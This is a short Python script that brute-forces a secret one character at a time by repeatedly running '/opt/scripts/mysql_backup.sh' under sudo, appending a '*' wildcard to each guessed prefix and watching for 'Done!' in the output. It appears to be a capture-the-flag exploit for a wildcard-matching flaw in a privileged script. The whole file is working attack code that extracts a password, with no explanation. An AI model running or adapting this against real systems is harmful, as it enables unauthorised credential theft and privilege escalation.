import string
import subprocess

wordlist = string.ascii_letters + string.digits
cont = ""

while True:
    for i in wordlist:
        entrada = cont + i + "*"
        process = subprocess.Popen(
            ["sudo", "/opt/scripts/mysql_backup.sh"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Send input to the process and read its output in real-time
        stdout, stderr = process.communicate(input=entrada)

        # Check if the output contains "Done!" to detect success
        if "Done!" in stdout:
            cont += i
            print("Found:", cont)
            break
        elif stderr:  # Print any errors to diagnose issues
            print("Error:", stderr)
